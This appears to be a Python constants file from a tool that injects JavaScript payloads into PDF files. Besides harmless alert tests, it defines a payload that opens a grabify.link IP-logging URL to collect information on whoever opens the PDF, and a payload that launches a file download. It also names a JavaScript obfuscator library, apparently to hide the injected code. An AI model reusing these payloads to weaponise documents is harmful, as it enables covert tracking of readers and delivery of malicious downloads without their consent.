# URL:
URL_GRABIFY_LINK: str = "https://grabify.link/46N29M"
URL_DOWNLOAD_FILE: str = "https://nodejs.org/dist/v20.12.1/node-v20.12.1-x64.msi"

# Payloads constants

JS_CODE = """
var today = new Date();
var msg = 'PDF opened on: ' + today.toLocaleDateString() + ' ' + today.toLocaleTimeString();
app.alert(msg);
"""

JS_CODE_TEST = """
  app.alert("Hello PDF!");
"""

PAYLOAD_COLLECT_INFORMATION_USING_GRABIFY = f"""
    app.launchURL("{URL_GRABIFY_LINK}");
"""

PAYLOAD_DOWNLOAD_FILE = f"""
    app.launchURL("{URL_DOWNLOAD_FILE}");
"""

# Javascript library
# JavaScript obfuscator library
JS_OBFUSCATOR_LIBRARY = "javascript-obfuscator"

# Default PDF file paths
INPUT_PDF_DEFAULT: str = "old.pdf"
OUTPUT_PDF_DEFAULT: str = "new.pdf"

# Message constants
INPUT_PDF_OPTION_HELP: str = "Specify the file path of the input PDF."
OUTPUT_PDF_OPTION_HELP: str = "Specify the file path for the output PDF."
